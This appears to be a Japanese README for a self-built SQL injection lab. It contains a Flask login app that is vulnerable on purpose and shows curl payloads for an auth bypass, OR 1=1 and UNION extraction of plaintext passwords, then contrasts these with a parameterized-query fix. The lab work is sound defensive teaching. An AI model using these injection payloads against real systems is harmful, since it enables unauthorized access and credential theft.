# SQLi 実証ラボ(エージェント不要・サンドボックス内完結版)

Strix(AIエージェントによる自動ペンテスト)をローカル(Windows/WSL2 + Ollama/Groq/OpenRouter)で
動かす一連の試み([`../strix-local-poc/windows-wsl-ollama-setup.md`](../strix-local-poc/windows-wsl-ollama-setup.md))
と並行して、「発想を変えて、AIエージェントなしでSQLi自体を実証する」ために作った最小限のラボ。

Claude Codeのクラウドサンドボックス環境は外向きのLLM通信がほぼ全てブロックされているため
(詳細は[`../strix-local-backend-notes.md`](../strix-local-backend-notes.md))、Strixのようなエージェント実行は
ここでは成立しなかった。一方で、**このサンドボックス自体を対象にしたSQLi実証**であれば、
外部通信は一切不要(pip install flaskのみでpypi.orgに1回アクセスするだけ)なので、問題なく完結した。

> ⚠️ 本コードは意図的に脆弱です。自分が所有・管理する隔離環境以外では絶対に動かさないこと。

## 対象アプリ

[`vulnerable_app.py`](vulnerable_app.py): Flask + SQLite の最小ログインアプリ。

- `/login`: 文字列連結でSQLを組み立てる、**意図的に脆弱**なエンドポイント
- `/login_safe`: パラメータ化クエリ(プレースホルダ `?`)を使う、**修正済み**の同じ機能のエンドポイント

起動:

```bash
pip3 install --user flask
python3 vulnerable_app.py   # http://127.0.0.1:5000
```

## 実証した攻撃(すべて `curl` で再現可能)

### 1. 認証バイパス(コメントアウトでパスワード条件を無効化)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=anything"
```

生成されるSQL:

```sql
SELECT id, username, is_admin FROM users WHERE username = 'admin' --' AND password = 'anything'
```

結果: パスワードを一切知らずに `admin`(is_admin=1)でログイン成立。

### 2. OR 1=1(常に真の条件で全行マッチ)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=admin' OR '1'='1' --" \
  --data-urlencode "password=anything"
```

結果: 全ユーザー行が返り、ログイン成立。

### 3. UNIONベースのデータ抽出(パスワードを直接窃取)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=nobody' UNION SELECT id, username, password FROM users --" \
  --data-urlencode "password=x"
```

結果:

```
Rows: [(1, 'alice', 'alice_pw_123'), (2, 'bob', 'bob_pw_456'), (3, 'admin', 'S3cretAdminPW!')]
```

ログインすら試みずに、全ユーザーの平文パスワード(admin含む)を直接取得できた。

### 対策の効果(同じ攻撃を `/login_safe` に送る)

```bash
curl -s -G "http://127.0.0.1:5000/login_safe" \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=anything"
# => "Login failed." (攻撃文字列はただの文字列として扱われ、無効化される)
```

パラメータ化クエリ(プレースホルダ + バインド)に変えるだけで、同じ入力が
SQL構文として解釈されなくなり、上記3つの攻撃すべてが無効になる。

## まとめ・学び

- SQLiの本質(文字列連結でSQLを組み立てる = 入力がコードとして解釈される)は、
  Strixのような自動ツールを使わなくても、数行のコードと`curl`だけで即座に再現・実証できる。
- 自動ペンテストエージェント(Strix)は「人手で1件ずつ試す」作業を自動化するものであり、
  SQLiという脆弱性クラス自体の理解や実証には必須ではない。
- 修正は複雑な話ではなく、**文字列連結をやめてパラメータ化クエリにする**、の一点に尽きる。
  (ORMを使っている場合も、素のSQL文字列を組み立てる箇所が残っていないか要確認。)

## このラボとStrix PoCの関係

- Strix PoC([`../strix-local-poc/`](../strix-local-poc/))は「AIエージェントに自動でSQLiを見つけさせる」
  という、より野心的な目標に取り組んだ(local LLM・Groq・OpenRouter全てで構造的な壁に当たり、
  未完のまま)。
- 本ラボは、同じ「SQLiを実際に試す」というゴールを、エージェントを使わずに最短距離で達成した。
  両者は競合するものではなく、「ツールに頼らなくても検証はできる」という補完的な結論を示している。
